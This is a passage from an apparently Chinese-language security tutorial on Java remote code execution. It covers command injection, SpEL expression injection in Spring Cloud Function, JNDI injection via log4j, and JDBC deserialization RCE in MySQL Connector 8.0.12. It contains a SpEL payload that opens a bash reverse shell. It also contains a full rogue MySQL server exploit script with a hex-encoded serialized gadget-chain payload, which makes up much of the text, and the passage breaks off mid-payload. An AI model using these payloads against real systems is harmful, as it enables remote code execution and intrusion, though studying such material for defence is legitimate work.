题） 
但是用 cmd /c 是可以的，不过如果开发写的是 ping 加参数依旧是
不能直接拼接的，必须 command 全部参数都可控才行 
表达式注入 
然后就是 java 的表达式注入，这里用最近的 Spring Cloud Function 的
spel 表达式注入做测试（因为好找靶场，本地环境一直搭不起来）（除
了 spel 还有 OGNL,MVEL,EL 等，这里只用 spel 举例做测试） 
先看一个简单的 demo，这里我们发现 12 行的 expression 代入到了
13 行的 parseExpression 中，可以解析 java.lang.Runtime 类，那么我
们就可以直接执行命令 
后面就是反弹 shell 了，网上文章较多，大家自行测试 
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,base64 加密的
shell}|{base64,-d}|{bash,-i}") 
原理分析，参考（https://www.t00ls.cc/thread-65356-1-1.html） 
这里获取 post，然后将参数转到 processRequest 
往下跟进 processRequest 
注意这里是 header，这也是为啥 payload 在 header 中传输 
然后跟进 apply 进去 
传进来的数据跟进 doApply，在进去 doApply 方法看 
跟进 apply 
发现参数到了 route,在跟进 route 
判 断 请 求 头 有 没 有 spring 那 段 ， 如 果 有 的 话 就 进 入 到
functionFromExpression 里代入，那我们进去这个函数看一下 
跟开头一样，这里的 parseExpression 直接带入进来解析，所以也就
成功的 rce 了 
JNDI 注入 
这里的 jndiName 可控，我们就可以直接造成 Rce 
“RMI（Remote Method Invocation），是一种跨 JVM 实现方法调用的
技术。 
在 RMI 的通信方式中，由以下三个大部分组成： 
Client 
Registry 
Server 
其中 Client 是客户端，Server 是服务端，而 Registry 是注册中心。 
客户端会 Registry 取得服务端注册的服务，从而调用服务端的远程方
法。 
注册中心在 RMI 通信中起到了一个什么样的作用？我们可以把他理
解成一个字典，一个负责网络传输的模块。 
服务端在注册中心注册服务时，需要提供一个 key 以及一个 value，
这个 value 是一个远程对象，Registry 会对这个远程对象进行封装，
使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，
则需要先通过 Registry 获取到这个远程代理对象，使用远程代理对象
与服务端开放的端口进行通信，从而取得调用方法的结果。 
” 
Jndi 注入最知名的案例应该就是 log4j 了 
原理分析 
解开 jar 包 
入口 
主要是 127-132 这段 
127 逻辑进去后，129 行判断字符串中是否包含 ${ 如果包含，就将
从这个字符开始一直到字符串结束替换为下面的值，然后就是 132 替
换值的地方 
跟进 getStrSubstitutor() 
JDBC 反序列化 RCE 
Java 还有一种独有的 RCE 方法就是 JDBC 可控配合反序列化的 RCE 
官网下载 8.0.12 版本 
https://downloads.mysql.com/archives/c-j/ 
看着两个参数组成的 payload 
官方介绍 
queryInterceptors ： 一 个 逗 号 分 割 的
Class
列 表 （ 实 现 了
com.mysql.cj.interceptors.QueryInterceptor 接口的类），在 Query”之
间”进行执行来影响结果。
（效果上来看是在 Query 执行前后各插入一
次操作）； 
autoDeserialize：自动检测与反序列化存在 BLOB 字段中的对象； 
设置为 com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 这
个类之后，每次执行查询语句，都会调用拦截器的 preProcess 和
postProcess 方法 
看到 
\mysql-connector-java-8.0.12\src\main\user-
impl\java\com\mysql\cj\jdbc\interceptors\ServerStatusDiffIntercepto
r.java 
文件中的 preProcess 里的 populateMapWithSessionStatusValues，跟
进这个函数 
跟 进 去 之 后 发 现 先 执 行 了 show session status ， 然 后 传 到
resultSeToMap 中，跟进这个函数 
我们可以看到在 resultSeToMap 中出现了 getObject 
这里跟进的是 
\mysql-connector-java-8.0.12\src\main\user-
impl\java\com\mysql\cj\jdbc\result\ResultSetImpl.java 
可以看到 try 语句中存在 readObject 
最后贴上 Tri0mphe7 师傅的脚本 
# -*- coding:utf-8 -*- 
#@Time : 2020/7/27 2:10 
#@Author: Tri0mphe7 
#@File : server.py 
import socket 
import binascii 
import os 
greeting_data="4a0000000a352e372e31390008000000463b4526233
42c2d00fff7080200ff811500000000000000000000032851553e5c235
02c51366a006d7973716c5f6e61746976655f70617373776f726400" 
response_ok_data="0700000200000002000000" 
def receive_data(conn): 
    data = conn.recv(1024) 
    print("[*] Receiveing the package : {}".format(data)) 
    return str(data).lower() 
def send_data(conn,data): 
    print("[*] Sending the package : {}".format(data)) 
    conn.send(binascii.a2b_hex(data)) 
def get_payload_content(): 
    //file 文件的内容使用 ysoserial 生成的 使用规则  java -jar 
ysoserial [common7 那个]  "calc" > a  
    file= r'a' 
    if os.path.isfile(file): 
        with open(file, 'rb') as f: 
            payload_content 
= 
str(binascii.b2a_hex(f.read()),encoding='utf-8') 
        print("open successs") 
    else: 
        print("open false") 
        #calc 
payload_content='aced0005737200116a6176612e7574696c2e48617
368536574ba44859596b8b7340300007870770c000000023f4000000
0000001737200346f72672e6170616368652e636f6d6d6f6e732e636f
6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7
472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f
6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574
696c2f4d61703b7870740003666f6f7372002a6f72672e617061636865
2e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a79
4d61706ee594829e7910940300014c0007666163746f727974002c4c6
f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e73
2f5472616e73666f726d65723b78707372003a6f72672e61706163686
52e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f727
32e436861696e65645472616e73666f726d657230c797ec287a970402
00015b000d695472616e73666f726d65727374002d5b4c6f72672f617
0616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e
73666f726d65723b78707572002d5b4c6f72672e6170616368652e636
f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d657
23bbd562af1d83418990200007870000000057372003b6f72672e617
0616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e6
3746f72732e436f6e7374616e745472616e73666f726d657258769011
4102b1940200014c000969436f6e7374616e7471007e000378707672
00116a6176612e6c616e672e52756e74696d65000000000000000000
000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f
6c6c656374696f6e732e66756e63746f72732e496e766f6b657254726
16e73666f726d657287e8ff6b7b7cce380200035b0005694172677374
00135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d65746
86f644e616d657400124c6a6176612f6c616e672f537472696e673b5b
000b69506172616d54797065737400125b4c6a6176612f6c616e672f4
36c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563
743b90ce589f1073296c02000078700000000274000a67657452756e7
4696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d
7aecbcd5a990200007870000000007400096765744d6574686f64757
1007e001b00000002767200106a6176612e6c616e672e537472696e6
7a0f0a4387a3bb34202000078707671007e001b7371007e001375710
07e001800000002707571007e001800000000740006696e766f6b657
571007e001b00000002767200106a6176612e6c616e672e4f626a656
374000000000000000000000078707671007e00187371007e0013757
200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7
b4702000078700000000174000463616c63740004657865637571007
e001b0000000171007e00207371007e000f737200116a6176612e6c6
16e672e496e746567657212e2a0a4f781873802000149000576616c75
65787200106a6176612e6c616e672e4e756d62657286ac951d0b94e0
8b020000787000000001737200116a6176612e7574696c2e48617368
4d61700507dac1c31660d103000246000a6c6f6164466163746f72490
0097468726573686f6c6478703f400000000000007708000000100000
0000787878' 
    return payload_content 
# 主要逻辑 
def run(): 
    while 1: 
        conn, addr = sk.accept() 
        print("Connection come from {}:{}".format(addr[0],addr[1])) 
        # 1.先发送第一个 问候报文 
        send_data(conn,greeting_data) 
        while True: 
            # 登录认证过程模拟  1.客户端发送 request login 报
文 2.服务端响应 response_ok 
            receive_data(conn) 
            send_data(conn,response_ok_data) 
            #其他过程 
            data=receive_data(conn) 
            #查询一些配置信息,其中会发送自己的 版本号 
            if "session.auto_increment_increment" in data: 
_payload='01000001132e00000203646566000000186175746f5f696e
6372656d656e745f696e6372656d656e74000c3f001500000008a0000
000002a00000303646566000000146368617261637465725f7365745f
636c69656e74000c21000c000000fd00001f00002e000004036465660
00000186368617261637465725f7365745f636f6e6e656374696f6e000
c21000c000000fd00001f00002b000005036465660000001563686172
61637465725f7365745f726573756c7473000c21000c000000fd00001f
00002a00000603646566000000146368617261637465725f7365745f7
36572766572000c210012000000fd00001f0000260000070364656600
000010636f6c6c6174696f6e5f736572766572000c210033000000fd00
001f000022000008036465660000000c696e69745f636f6e6e6563740
00c210000000000fd00001f0000290000090364656600000013696e74
65726163746976655f74696d656f7574000c3f001500000008a000000
0001d00000a03646566000000076c6963656e7365000c21000900000
0fd00001f00002c00000b03646566000000166c6f7765725f636173655
f7461626c655f6e616d6573000c3f001500000008a000000000280000
0c03646566000000126d61785f616c6c6f7765645f7061636b6574000c
3f001500000008a0000000002700000d03646566000000116e65745f7
7726974655f74696d656f7574000c3f001500000008a0000000002600
000e036465660000001071756572795f63616368655f73697a65000c3
f001500000008a0000000002600000f03646566000000107175657279
5f63616368655f74797065000c210009000000fd00001f00001e000010
036465660000000873716c5f6d6f6465000c21009b010000fd00001f00
0026000011036465660000001073797374656d5f74696d655f7a6f6e6
5000c21001b000000fd00001f00001f00001203646566000000097469
6d655f7a6f6e65000c210012000000fd00001f00002b00001303646566
000000157472616e73616374696f6e5f69736f6c6174696f6e000c2100
2d000000fd00001f000022000014036465660000000c776169745f746
96d656f7574000c3f001500000008a000000000020100150131047574
663804757466380475746638066c6174696e31116c6174696e315f737
765646973685f6369000532383830300347504c01310734313934333
0340236300731303438353736034f4646894f4e4c595f46554c4c5f475
24f55505f42592c5354524943545f5452414e535f5441424c45532c4e4
f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c45525
24f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f41555